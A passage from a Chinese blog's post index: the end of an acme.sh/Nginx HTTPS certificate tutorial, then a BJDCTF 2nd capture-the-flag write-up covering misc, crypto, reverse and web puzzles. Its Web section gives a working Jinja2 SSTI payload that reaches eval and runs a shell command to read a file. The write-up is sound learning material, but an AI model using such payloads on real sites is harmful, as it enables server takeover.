注意：这一步只是生成了证书，并没有进行配置，因此访问网站当然上不了 https。 2.1 HTTP 验证这种方式 acme.sh 会自动在你的网站根目录下放置一个文件，来验证你的域名所有权，验证之后就签发证书，最后会自动删除验证文件。 前提是要绑定的域名已经绑定到了所在服务器上，且可以通过公网进行访问！ 2.1.1 Webroot mode假设服务器在运行着的，网站域名为 example.com，根目录为 /home/wwwroot/example.com。那么只需要执行下面这条语句就行。 acme.sh --issue -d example.com -w /home/wwwroot/example.com 2.1.2 Apache / Nginx mode如果用的是 Apache 或者 Nginx 服务器，可以自动寻找配置文件来进行签发。 acme.sh --issue -d example.com --apache # Apache acme.sh --issue -d example.com --nginx # Nginx 如果找不到配置文件的话可以自行配置。 acme.sh --issue -d example.com --nginx /etc/nginx/nginx.conf # 指定nginx的conf acme.sh --issue -d example.com --nginx /etc/nginx/conf.d/example.com.conf # 指定网站的conf 2.1.3 Standalone mode这种方式下，acme.sh 会自己建立一个服务器来完成签发。主要适合的是没有建立服务器的情况，不过其实有服务器的话只要暂时关闭，不造成端口冲突就能使用。 http 模式，80端口： acme.sh --issue -d example.com --standalone 如果用了反代之类的不是 80 端口，则可以手动指定。 acme.sh --issue -d example.com --standalone --httpport 88 当然它还支持 tls 模式，不是 443 端口的话也可以自行指定。 acme.sh --issue -d example.com --alpn acme.sh --issue -d example.com --alpn --tlsport 8443 # 自行指定tls端口 2.2 DNS 验证这种方式下，不需要任何服务器，不需要任何公网 ip，只需要 dns 的解析记录即可完成验证。 比如说服务器不能直接公网访问，以及某些 VPS 直接绑定域名没备案的话是上不去的，就需要采用这种方案了。（我的就是了 当然，手里有域名只是想生成一个证书而已也可以这么用。 2.2.1 DNS API mode这种方式贼强大，直接可以利用域名服务商提供的 API 就可以自动帮你添加 TXT 记录完成验证和证书签发。而且60天后还可以自动完成续期。（我就是用这种方式实现哒~ 比如说 CloudFlare 的，在这里获取你的API Key。可以用全局 API Key，将参数导入到命令行。 export CF_Token=\"sdfsdfsdfljlbjkljlkjsdfoiwje\" export CF_Account_ID=\"xxxxxxxxxxxxx\" 为了限制权限，可以新建一个区域的 API Key. 这里只需要 Zone.DNS 的编辑权限（restrict the API Token only for write access to Zone.DNS for a single domain）就行。 export CF_Token=\"sdfsdfsdfljlbjkljlkjsdfoiwje\" export CF_Account_ID=\"xxxxxxxxxxxxx\" export CF_Zone_ID=\"xxxxxxxxxxxxx\" Account_ID 和 Zone_ID 在域名的管理页面右下方可以得到。 而后再签发证书。 acme.sh --issue --dns dns_cf -d example.com 之后这些配置信息会保存到 ~/.acme.sh/account.conf 这个文件里，在证书续期或者其他利用 CF 进行验证的时候会自动调用。 当然，国内一般用的是 DNSPod，也提供了 API，类似配置就好了。 export DP_Id=\"1234\" export DP_Key=\"sADDsdasdgdsf\" acme.sh --issue --dns dns_dp -d example.com -d www.example.com （这个其实就是多域名签发了） 更多例子参考官方 Wiki 好了→ How to use DNS API 2.2.2 DNS manual mode适合域名服务商没有提供 API 的情况，需要自己在域名配置一个 TXT 记录，且不能自动续期，每次都需要重新配置。 acme.sh --issue -d example.com --dns -d www.example.com 更多请参考官方教程 DNS manual mode。 2.2.3 DNS alias mode如果域名服务商没有提供 API，或者是一个挺重要的域名，为了安全不希望或者不方便直接配置这个域名的解析记录，可以通过另一个没那么重要的域名（可能是专门用来签发证书的）间接进行配置。 实际上还是需要有一个域名来验证所有权啦！ 更多参考官方教程 DNS alias mode 好了。 2.3 多域名配置多个域名签发同一张证书。只需要在验证方式之后添加多个 -d &lt;YourDomainHere&gt; 参数就行。 acme.sh --issue -d example.com -w /home/wwwroot/example.com -d www.example.com acme.sh --issue -d example.com --standalone -d www.example.com acme.sh --issue -d example.com --dns -d www.example.com 也可以多个域名指定不同的验证方式，例如 acme.sh --issue \\ -d aa.com -w /home/wwwroot/aa.com \\ -d bb.com --dns dns_cf \\ -d cc.com --apache \\ -d dd.com -w /home/wwwroot/dd.com 2.4 泛域名配置Wildcard certificates 同理，只需要加个*就好。不过好像只适用于 DNS 验证的方式。 acme.sh --issue -d example.com -d '*.example.com' --dns dns_cf 2.5 签发 ECC 证书默认签发的都是基于 RSA 密钥加密的证书，而 ECC (Elliptic Curve Cryptography, 椭圆曲线密码) 密钥的保密性比 RSA 更好，密钥长度更短，更能对抗量子解密等，目前现代的操作系统和浏览器都支持 ECC 证书了（Windows XP 及其之前的就算了）。 Let's Encrypt 提供了 ECDSA 证书的签发，且 acme.sh 也支持。 我看网上的教程基本没讲 ECC 证书的签发，这里就来整一下呗！ 其实只需要加上一个以 ec- 为前缀的 --keylength 参数（或 -k）就可以了。理论上上面的各种验证方式都适用。 比如 acme.sh --issue -w /home/wwwroot/example.com -d example.com --keylength ec-256 # 单域名 acme.sh --issue -w /home/wwwroot/example.com -d example.com -d www.example.com --keylength ec-256 # 多域名 支持以下长度的证书，一般就用 ec-256 就行了。 ec-256 (prime256v1, “ECDSA P-256”) ec-384 (secp384r1, “ECDSA P-384”) ec-521 (secp521r1, “ECDSA P-521”, which is not supported by Let’s Encrypt yet.) 0x03 安装(copy)证书签发证书成功后，需要把证书安装或者复制到真正需要的地方，如 nginx / apache 的目录下。 官方说必须用下面的命令来安装证书，不能直接用 ~/.acme.sh/目录下的证书文件，因为那只能内部使用，且未来目录结构可能会更改。 我们只需要使用 --installcert 命令，指定目标位置，然后证书文件就会被 copy 到相应的位置了。 其中域名是必须的，其他参数是可选的。 有必要的话，可能需要对证书文件的所属权限进行一些设置。（我这边没有问题呢，就略了吧） 3.1 Nginxacme.sh --installcert -d example.com \\ --key-file /path/to/keyfile/in/nginx/key.pem \\ --fullchain-file /path/to/fullchain/nginx/cert.pem \\ --reloadcmd \"service nginx force-reload\" 比如你可以在 nginx 的目录下新建一个 ssl 目录，然后把证书安装 / copy 过去。 acme.sh --installcert -d example.com \\ --key-file /etc/nginx/ssl/example.com.key \\ --fullchain-file /etc/nginx/ssl/example.com.fullchain.cer \\ --reloadcmd \"service nginx force-reload\" 这里用的是 service nginx force-reload, 不是 service nginx reload, 据测试, reload 并不会重新加载证书, 所以用的 force-reload。 Nginx 的配置 ssl_certificate 使用 /etc/nginx/ssl/fullchain.cer ，而非 /etc/nginx/ssl/.cer ，否则 SSL Labs 的测试会报 Chain issues Incomplete 错误。 3.2 Apacheacme.sh --install-cert -d example.com \\ --cert-file /path/to/certfile/in/apache/cert.pem \\ --key-file /path/to/keyfile/in/apache/key.pem \\ --fullchain-file /path/to/fullchain/certfile/apache/fullchain.pem \\ --reloadcmd \"service apache2 force-reload\" 在命令中的 reloadcmd 参数很重要！ 这个用来指定证书更新（Renew）后执行的命令，从而使续期后的证书生效。 默认 60 天就会续期一次，上面这些参数会记录下来并自动执行。（几好，贼方便 0x04 生成 dhparam.pem 文件（可选）openssl dhparam -out /etc/nginx/ssl/dhparam.pem 2048 这一步是为了增强 SSL 的安全性。这里生成一个更强壮的 DHE 参数。 前向安全性（Forward Secrecy）的概念很简单：客户端和服务器协商一个永不重用的密钥，并在会话结束时销毁它。服务器上的 RSA 私钥用于客户端和服务器之间的 Diffie-Hellman 密钥交换签名。从 Diffie-Hellman 握手中获取的预主密钥会用于之后的编码。因为预主密钥是特定于客户端和服务器之间建立的某个连接，并且只用在一个限定的时间内，所以称作短暂模式（Ephemeral）。 使用了前向安全性，如果一个攻击者取得了一个服务器的私钥，他是不能解码之前的通讯信息的。这个私钥仅用于 Diffie Hellman 握手签名，并不会泄露预主密钥。Diffie Hellman 算法会确保预主密钥绝不会离开客户端和服务器，而且不能被中间人攻击所拦截。 nginx 依赖于 OpenSSL 给 Diffie-Hellman （DH）的输入参数。不幸的是，这意味着 Diffie-Hellman Ephemeral（DHE）将使用 OpenSSL 的默认设置，包括一个用于密钥交换的1024位密钥。因为我们正在使用2048位证书，DHE 客户端就会使用一个要比非 DHE 客户端更弱的密钥交换。 更多参考这里 Guide to Deploying Diffie-Hellman for TLS 吧。 0x05 配置 Nginx没用过 Apache，这里只说 Nginx 好了。（其实也不怎么会用（小声bb 修改网站的 conf 配置文件，加入 SSL 的相关配置。 server { server_name example.com; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; # ... # ssl 相关配置 ssl_certificate /etc/nginx/ssl/example.com.fullchain.cer; ssl_certificate_key /etc/nginx/ssl/example.com.key; ssl_dhparam /etc/nginx/ssl/dhparam.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers '[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES'; ssl_prefer_server_ciphers on; # ... } ssl_dhparam /etc/nginx/ssl/dhparam.pem; 是在 0x04 步骤中生成的，可选。 ssl_ciphers 用于指定加密套件，这里采用的是 CloudFlare 家的，具体也不是很清楚 emmm。可以参考一下 Mozilla 的 Wiki：Security/Server Side TLS 更多参数可以参考 nginx 的文档：Module ngx_http_ssl_module TLSv1.3（可选）现在很多网站都上 TLSv1.3 了，证书检测的网站对于 TLSv1、TLSv1.1 都认为不安全了，Firefox 自 74.0 版本开始也完全放弃对加密协议 TLS 1.0 和 TLS 1.1 的支持了。 对于 TLSv1.3 的配置，需要安装最新版的 openssl（OpenSSL 1.1.1 built with TLSv1.3或更高），而后重新编译 nginx，是有点麻烦这里懒得弄了，后面需要再折腾吧。 开启 HSTS（可选）当然，为了更加安全，可以选择开启 HSTS（HTTP Strict Transport Security，HTTP严格传输安全协议），强制浏览器通过 https 进行访问。需要在 location 下的设置中加入一个 header。 add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"; 接下来的一年（即31536000秒）中，浏览器看到 header 中包含 Strict-Transport-Security 的话就会自动切换到 https。 但是在首次访问网站时如果被劫持了，浏览器还是可能会通过 HTTP 明文传递信息。为此，Chrome 维护了一个 HSTS preload list，内置在浏览器中，对于 Chrome, Firefox, Opera, Safari, IE 11 and Edge 等主流浏览器也适用。可以在这里提交你的域名到这个列表里。（不过提交之前要考虑好，全站上 https 噢 如果 TLS 证书无效或不可信，用户不能忽略浏览器警告继续访问网站。这就是前几天访问 GitHub (Pages) 等网站被拦下来的原因了。 上面的配置完成后检查一下配置是否正确，而后重启 nginx。 nginx -t systemctl restart nginx 之后就可以试一下能不能通过 https 来访问自己的网站啦！ 到这里 SSL 配置就告一段落了，下面是一些 acme.sh 的维护相关的了。 0x06 更新证书证书的有效期为 90 天，acme.sh 会 60 天更新（Renew）一次。 在安装 acme.sh 的时候就自动配置了一条 cron 任务了，会每天检查证书的情况。当然可以到 crontab 里看一下。 # crontab -l 43 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" &gt; /dev/null 也可以试着用上面这条命令执行看一下相关的配置是否正确。 强制更新可以这样。 acme.sh --renew -d example.com --force acme.sh --renew -d example.com --force --ecc # 如果用的是ECC证书 0x07 停止更新证书查看证书列表 acme.sh --list 停止 Renew acme.sh --remove -d example.com [--ecc] 之后手动把目录下的证书移除就行。 0x08 升级 acme.shacme.sh --upgrade # 手动升级 acme.sh --upgrade --auto-upgrade # 自动升级 acme.sh --upgrade --auto-upgrade 0 # 停止自动升级 0xFF 小结除了上面这些配置之外，acme.sh 还提供了通知提醒，可以调用其他 API 来推送提醒，具体参考官方Wiki：notify。 总之感觉这个工具还是很实用的，大大降低了 SSL 配置的门槛呢。 草（一种植物），感觉我把官方的教程翻译了，然后又找了一些其他的资料整合起来了的亚子emmm。不过大部分还是自己手码的字啦！ 实际上我这次配置的是 ECC 密钥的泛域名证书，用的是 DNS API 的模式。其实几个月前就折腾过 SSL 证书的配置了，然而过了就忘了，当时先是用 HTTP 模式进行验证，发现行不通才换的 DNS 模式。这次干脆一起理一遍好了，过程中发现原来 HTTP 模式验证比我想的还要强大，只是需求（主要是需要泛域名证书）对不上罢了。 怎么说好呢，绝对安全不大可能，都是想方设法尽可能相对安全一些呢。 希望这一篇不会浪费您的宝贵时间呢，有用的话欢迎给我买点好吃的/buy me a coffee（饿了喵 溜了溜了（ References &amp; Extensive Reading下面有的是官方文档，有的是博客之类的，由于时效性有些内容可能不适用了。注意一下就吼。 acme.sh GitHub 仓库 官方中文说明 How to issue a cert（官方Wiki） How to use DNS API Security/Server Side TLS （Nginx文档）Module ngx_http_ssl_module 开始使用ECC证书部署HTTPS MySSL HTTPS 评级 B 升 A+ Nginx开启TLSv1.3和HTTP/2 etc.","path":"2020/03/28/Server_IssueACertWithACME/"},{"title":"CTF | BJDCTF 2nd WriteUp","text":"引言 本届BJDCTF由江苏科技大学、北京工业大学、西南民族大学、杭州师范大学、 江苏大学、湖南工业大学（排名不分先后）联合举办 划水划水~ 周末水了一下 BJDCTF 2nd。 看了一下，好像 BJDCTF 2020 已经有过一轮比赛了唉，这是第二届了？？？（一个月一届？ 官方声称这是一个萌新赛，总体难度不算很大，于是就来玩了一下。 然而喵喵喵，的确让我知道了自己本来就是萌新。嘤嘤嘤。 题目在这里↓。 BUUCTF 公开赛道：戳这里hint 汇总：在这里 这次玩的不多，主要做了点 Misc, Crypto, Reverse 的题，Web 没怎么看（后面可能会学一下 PHP、SQL 吧），pwn 没看…… 简单写一下 WriteUp 吧，有的参考了一下大佬们的思路，不完善的后面再补吧。 MISC最简单的misc-y1ng压缩包伪加密，末尾两个 504B0102 之后的加密位改为 00. 解压后看到是 IHDR ，噢是 png，补上文件头 89504E47. 得到下面的图片。 424A447B79316E677A756973687561697D hex 转 ASCII BJD{y1ngzuishuai} A_Beautiful_Picture图片大小改了。。 得到 EasyBaBa 图片二进制拼接隐写，提取得到压缩包，压缩包里是 里面都是出题人.jpg。 十六进制编辑器看发现是 avi 格式。改后缀播放，噢是 性感钉钉在线求饶 的视频。 发现插入了几个图片，还有二维码。 于是 PR 大法好。逐帧看得到下面几张二维码。 分别得到 6167696E5F6C -&gt; agin_l 6F76655F59 -&gt; ove_Y 424A447B696D -&gt; BJD{im 316E677D -&gt; 1ng} 连成一句话 BJD{imagin_love_Y1ng} （这俩啥关系唉 嘤嘤嘤 Real_EasyBaBa 刚开始以为是 LSB 之类的，看了各个图层都没明显的，但整体都是有明显的颗粒感…… 后来以为是和上面那题的图有关系，对两张图做了加减等等操作，没有收获。 再看 hex 数据，这一堆还是感觉像二维码，这么规则的0和1。 最后，在我准备关掉 010editor 的时候，伸了个懒腰，从远处看，啊！ 这也太有脑洞了吧！（自行脑补将FF或ÿÿ看成是实线就行） 于是得到flag。 BJD{572154976} （这好像是 imagin 师傅的QQ号唉 Imagin - 开场曲之前就看过这个 mikutap，前几天晚上还有个学弟 at 我来一起玩（探究）的…… 就是这个→http://taqini.space/mikutap/ ，多有意思呢。 他这个每一个按键对应着一个音调和一个动画，理论上可以逆向回去得到 flag。 拖进 PR 了反复听了好多遍，确定了几个字符，比如第一个字符应该是M…… 原来是根据音调和动画来判断的，换了一个浏览器，发现动画不一样了，草（一种植物），不玩了惹。 思路感觉可以先录一段 BGM，做一个 sub 把视频中的 BGM 去除。而后给每一个按键录一个，确定映射关系，理论上就能唯一对应上原始按键。 （感觉直接听出来的真强，怕不是音游大佬？ TARGZ-y1ng这道题之前一直没解出来，最后放了 hint 说解压密码是文件名。 于是手动解压了几个……每个都是上一个的密码。 发现这样估计好久都解不完，于是写 jio 本！ 搜了一下压缩包解压的 API，改了一下别人的代码，写了个循环。 考虑到最后的 flag 套娃很多不方便打开，于是就统一解压到一个相同的目录下好了。 import sys import os import zipfile def unzip_single(src_file, dest_dir, password): ''' 解压单个文件到目标文件夹。 ''' if password: password = password.encode() zf = zipfile.ZipFile(src_file) try: zf.extractall(path=dest_dir, pwd=password) except RuntimeError as e: print(e) zf.close() if __name__ == '__main__': source_dir = r'./hW1ES89jF' dest_dir = r'./hW1ES89jF' password = 'OKMIlLVft' i = 1 while True: entry_dir = dest_dir + '/' + password + '.tar.gz' print(i, password) dest_dir = source_dir + '/' + password unzip_single(entry_dir, dest_dir, password) entry = list(os.scandir(dest_dir))[0] if entry.is_file() and os.path.splitext(entry.name)[1] == '.gz': password = os.path.splitext(entry.name)[0][:-4] else: print('error!') print(entry) i += 1 跑了一下发现最后在8L0WifU3G这个目录下，套娃了 299 还是 300个压缩包…… 打开得到 flag： BJD{wow_you_can_rea11y_dance} 小姐姐-y1ng这题看了好久都没做出来……知道图片上有明显的错位，010editor 的脚本跑不下去。肯定是插入了东西。 用了 strings 找，然而太懒没开 Ubuntu，没用上 grep，于是出了一堆字符串没发现 BJD…… 怪我懒了（连 PentestBox 都懒得开，Ctrl + F 都懒得用 BJD{haokanma_xjj} Reverseguessgame猜大小的游戏唉。玩个毛线，没有flag！ 丢 IDA 里，看字符串就得到 flag。 BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA} 果然是个随机数逗你玩呢。 8086 看亚子只是把数据移到 DS 里，然后就死循环了。 之前学的微机原理 汇编忘得差不多了……（想起来这学期 DSP 后面编程还要用到 emmm 在 seg dseg 里有这一坨 ]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b; 想了半天不知道是什么。。base91 解码不行。 难道是大小端问题？ 不是。 后面打开了ASCII表，既然 flag 格式是 BJD{.+}，前四位肯定对应着BJD{。这里对应着列出来。 Bin （二进制） Oct （八进制） Dec （十进制） Hex （十六进制） 缩写/字符 0111 1101 0175 125 0x7D } 0100 0010 0102 66 0x42 B 0101 0101 0125 85 0x55 U 0100 1010 0112 74 0x4A J 0110 0100 0144 100 0x64 d 0111 1011 0173 123 0x7B { 突然就发现了规律！ 二进制后四位明显是取了反，前四位中的最低位也取了个反。 py一下，写了个jio本。 # -*- coding:utf-8 -*- s = ']U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;' output = '' for i in s: temp = (ord(i) ^ 0x0f) temp = chr(temp ^ 0x10) # 或者直接 ^ 0x1f print(temp) output += temp print(output) # BJD{jack_de_hu1b1an_xuede_henHa0}$ 于是得到 flag 了！ BJD{jack_de_hu1b1an_xuede_henHa0} 嘤 要好好学汇编呢（ 看了 WP 发现原来是解密的代码被 IDA 当成是数据了（就是assume ss:dseg, ds:nothing 上面的那一部分）。 奇怪了我拿 emu8086 模拟器也没看到这一段，还跑死循环了。噢，本来就没跑到解密那部分代码！ 偷一下出题师傅的源代码，来自这里。 DATAS SEGMENT str1 DB 5dH,55H,5bH,64H,75H,7eH,7cH,74H DB 40H,7bH,7aH,40H,77H,6aH,2eH,7dH,2eH DB 7eH,71H,40H,67H,6aH,7aH,7bH,7aH,40H DB 77H,7aH,71H,57H,7eH,2fH,62H,59 DATAS ENDS STACKS SEGMENT STACKS ENDS CODES SEGMENT ASSUME CS:CODES,DS:DATAS,SS:STACKS loc: jmp loc mov CX,34 lea BX,str1 lop: mov DI,CX dec DI xor BYTE PTR [BX][DI],31 loop lop lea DX,str1 mov AH,09H int 21H ret START: MOV AX,DATAS MOV DS,AX call loc MOV AH,4CH INT 21H CODES ENDS END START 解密的部分在lop里，果然是和 31（0x1F）做 xor。 Crypto签到-y1ngQkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ== base64 就行了。 BJD{W3lc0me_T0_BJDCTF} 燕言燕语-y1ng79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20 hex to ASCII： yanzi ZJQ{xilzv_iqssuhoc_suzjg} 这个试了各种密码，真没想到是 vigenere 密码，还在想 yanzi 是干啥用的…… （下次先考虑带有密钥的 BJD{yanzi_jiushige_shabi} https://www.qqxiuzi.cn/bianma/weijiniyamima.php Y1nglish-y1ngNkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw. Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd. MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw} 整了半天不知道咋办，最后想起来还有个词频大法！ 搜了一下，这个网站 可以分析词频。 很明显MIH对应着BJD。下面最像的就是这个了。 Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn't a Japanese name but he is really a Japanese. Harry woryed in a lawyer's office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. 'I have never borrrowed any money from you,' Harry said,'so now you can pay for my dinner!' Now i will give you what you want. BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy} 然而交上去不对。。 看了 hint 说 改成Cr4zy是错误的 突然想到是crack！于是得到 flag。（真就 quipquip 这个网站啊 BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck} cat_flag这是一张有着一堆喵喵的 gif。 8*10，想到是8位的 ASCII，10个字符。 01000010 果然是 B 01111011 果然是 {，之后是 01001101 00100001 01100001 00110000 01111110 01111101 于是得到flag：BJD{M!a0~} 真的是喵喵呀！ 灵能精通-y1ng 身经百战的Y1ng已经达到崇高的武术境界，以自律克己来取代狂热者的战斗狂怒与传统的战斗形式。Y1ng所受的训练也进一步将他们的灵能强化到足以瓦解周遭的物质世界。借由集中这股力量，Y1ng能释放灵能能量风暴来摧毁敌人的心智、肉体与器械。 之前只知道猪圈密码，找了半天才发现了这个编码。 圣堂武士密码 (Templar Cipher) 是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。 得到 IMKNIGHTSTEMPLAR 最终 flag 为 flag{IMKNIGHTSTEMPLAR}。 老文盲了罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝 这题还以为是佛曰，结果发现不是…… 看到别人提示发现真的蠢，下次先拿去给翻译读一遍就知道 flag 了。 啊不对- - flag 是 BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}。 圣火昭昭-y1ng这个是佛曰了，不过是新佛曰。 新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如 找了半天没找到解密网站。。来，收藏夹请。 新佛曰：http://hi.pcmoe.net/buddha.html 佛曰（与佛论禅）：http://keyfc.net/bbs/tools/tudoucode.aspx 得到 gemlovecom 开局一张图，flag全靠猜 因为出题人失误搞错了，解出来的key去掉后3位的com 去掉com套上 BJD 交上去发现不是。 想到可能这还是个 key/密钥。试了 F5 发现不是。 后来看别人的 WP 才知道是 outguess 图像隐写。（回去补一补 来了来了。 GitHub 仓库：https://github.com/crorvick/outguess OutGuess is a universal steganographic tool that allows the insertionof hidden information into the redundant bits of data sources. Thenature of the data source is irrelevant to the core of OutGuess. Theprogram relies on data specific handlers that will extract redundantbits and write them back after modification. In this version the PNMand JPEG image formats are supported. In the next paragraphs, imageswill be used as concrete example of data objects, though OutGuess canuse any kind of data, as long as a handler is provided. git clone https://github.com/crorvick/outguess.git cd outguess ./configure &amp;&amp; make &amp;&amp; make install （可能需要 sudo 常用的指令就加密和解密了。 outguess -k \"my secret key\" -d hidden.txt demo.jpg out.jpg # 加密 outguess -k \"my secret key\" -r out.jpg hidden.txt # 解密 outguess -k \"gemlove\" -r sheng_huo_zhao_zhao.jpg hidden.txt 得到 flag： BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy} rsa0噫？？？啥时候出的 RSA？没发现…… 来补一下吧。nc 连上，性感xx在线发题。（题目每个环境好像不同） e=8490247 p+q=21369803408498318739708021526026723998776452182678577483200290221438162215918869820587899450236798144391224673258554041165789338090777089646275960540717728 p-q=306146015710299885882907488963590997669550770952584505436005104300551321544811637977008351542375001985864015345039058904779091905194377534370393296886314 c=96533573625923830275446881118319408503602914319563862122714988417081897004192103015036939165809559375266874500604915724088338754724344545059907114669824228931409760092764538519264244823654706558401180531000987759255359721495957457449739266870026844498908937249390027970957614362784724540009268878226262563888 flag=?????? 分别求得 p = 10837974712104309312795464507495157498223001476815580994318147662869356768731840729282453900889586573188544344301796550035284214997985733590323176918802021 q = 10531828696394009426912557018531566500553450705862996488882142558568805447187029091305445549347211571202680328956757491130505123092791356055952783621915707 N = 114143693083732767570968317133346423549060454090175301453735671171095767847167710539383793168600011860725545060200762757793552681268747848968704851107766270420356743799632674648383021525392085925089984102330388262453473594582267963382904432339836113984790742410134450191464532864589123878301032917283483243847 d = 50742668784054743796077308928583295672870545303739312689100966737709824813210506078737292591220582907244279005756665043057883285178390377660818970279568204675194935893051526661876109033037071837499249580434595390423343646371583506816678001938953327743693429532902954037961714874373553064053942402868925112743 而后利用 m = pow(c, d, p*q) 求得 m=14337636555111949737591403676611178785005554188521046827164791353101910846974617354025302694785689419018 转 Hex 再转 ASCII，得到 flag flag{656092c1-50bb-459c-89ec-4cabc69b4f3e} 也可以用 long_to_bytes（需要安装密码库 pip install pycryptodome） from Crypto.Util import number print(number.long_to_bytes(m)) 想起来之前说要装 GitHub 上那个 python 的 CTF-RSA-tool 还没装…… rsa1nc 连上，得到题目。 e=12907381 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802 p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552 c=30690312081989972161704287726249224946940662102974666523203576217410481202381028355251332967180090326230702940141819337845402788001804202167909768819975074688832043578916709160998681086084701179452449493798807368207904007880376512732622389948601375493793025349147924632369047347529229462962308486909978038157 flag=?????? 再来一次 e=10288339 p^2+q^2=102932491463627835236007836419728692812257769950144692124303780069034558043288683315680953131433063800883414074678408539431834987237784935126939862697346288221662934067206187303336972862679183761578127642359897410735067557329508997996877528676457832325049393014306728671643082858956472153689328530485292574802 p-q=-185309818765397657063788122823542341789780127021615886794410874236918862158685471447960359346072372178791917183606614428484134793166273614667932437583552 c=40022015279445190961446033046832809408451288751696588671880831212771863683480569497860194263202064993145631813232350651196681717050659541769219283733622429570927906815646087878932340172422964403729228165631808591658687044189905364508055754933678525530280551473343005313236082014906927913996378291225656288550 flag=?????? p 和 q 不变，则 $$n = p*q = \\frac{p^2 + q^2 - (p-q)^2}{2}$$ 不变，考虑是共模攻击，后面来填坑。（等我装上 RSA tools Web这次没怎么看 Web 题……（（ fake google看到返回的页面上有个注释 &lt;!--ssssssti &amp; a little trick --&gt; 试了一下{{1-1}}可以得到 0，于是就是 SSTI 了。好像都不需要绕过。 payload： {% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %} {% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__(\"os\").popen(\"cd /;cat flag\").read()') }} {% endif %} {% endif %} {% endfor %} {% endif %} {% endfor %} http://f7ddf918-4b30-4225-b5c9-761bae6f5fdd.node3.buuoj.cn/qaq?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20%20%20%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20%20%20%20%20%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cd%20/;cat%20flag%22).read()%27)%20}}%20%20%20%20{%%20endif%20%}%20%20{%%20endif%20%}%20%20{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%} flag{8c252513-5c42-47fd-95b5-4d13a986e6d0} （貌似是动态 flag elementmaster​ 手绘的唉（重点不对 这里的id转 ASCII 得到 Po.php。 访问发现内容是一个 .，懵了。 给了 hint 说mendeleev=门捷列夫，还有 from requests import * 。 最后放了元素周期表……这脑洞真没想到。。 就是用元素周期表的元素去跑xx.php啦。（难怪扫描器没用 收个尾感觉这次 Crypto 和 Misc 题目本来就不怎么难，然而做起来感觉比较佛系，直接盲目上手，思路不大对，还懒。 有挺多套路没接触过的，脑洞还要大一点呢，后面有空再理一下做题的思路吧。 噢，官方 WP 也出来了，戳这里吧。 嘤，还有一堆作业没补。 溜了溜了。","path":"2020/03/23/CTF_BJDCTF2nd/"},{"title":"CTF | XCTF高校战“疫”网络安全分享赛 WriteUp","text":"前言上上周看到了这个 XCTF 的高校战“疫”网络安全分享赛，觉得有点意思可以玩一下。 